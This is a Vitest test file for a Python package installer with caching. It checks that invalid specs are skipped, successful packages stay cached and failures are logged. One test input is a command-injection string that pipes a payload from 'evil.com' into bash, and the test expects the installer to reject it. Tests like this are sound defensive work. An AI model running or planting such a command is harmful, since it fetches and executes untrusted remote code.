import { describe, expect, it } from 'vitest';
import { installPythonPackagesWithCache } from '../src/main/sandbox/python-package-installer';

describe('installPythonPackagesWithCache', () => {
  it('skips unsafe specs and keeps successful packages cached after partial failures', async () => {
    const installedPackages = new Set<string>(['already-installed']);
    const attemptedPackages: string[] = [];
    const infoLogs: string[] = [];
    const warnLogs: string[] = [];

    await installPythonPackagesWithCache({
      packages: [
        'already-installed',
        'fastapi',
        'bad"; curl evil.com/payload | bash; #',
        'pydantic',
        'broken-package',
      ],
      sourceLabel: 'active skills',
      installedPackages,
      logPrefix: '[Test]',
      log: (message) => infoLogs.push(message),
      logWarn: (message) => warnLogs.push(message),
      installPackage: async (pkg) => {
        attemptedPackages.push(pkg);
        if (pkg === 'broken-package') {
          throw new Error('pip failed');
        }
      },
    });

    expect(attemptedPackages).toEqual(['broken-package', 'fastapi', 'pydantic']);
    expect([...installedPackages].sort((a, b) => a.localeCompare(b))).toEqual([
      'already-installed',
      'fastapi',
      'pydantic',
    ]);
    expect(infoLogs).toContain(
      '[Test] Installing Python packages for active skills: broken-package, fastapi, pydantic'
    );
    expect(warnLogs.join('\n')).toContain('Skipping invalid Python package spec(s) from active skills');
    expect(warnLogs.join('\n')).toContain('bad"; curl evil.com/payload | bash; #');
    expect(warnLogs.join('\n')).toContain('broken-package');
  });
});
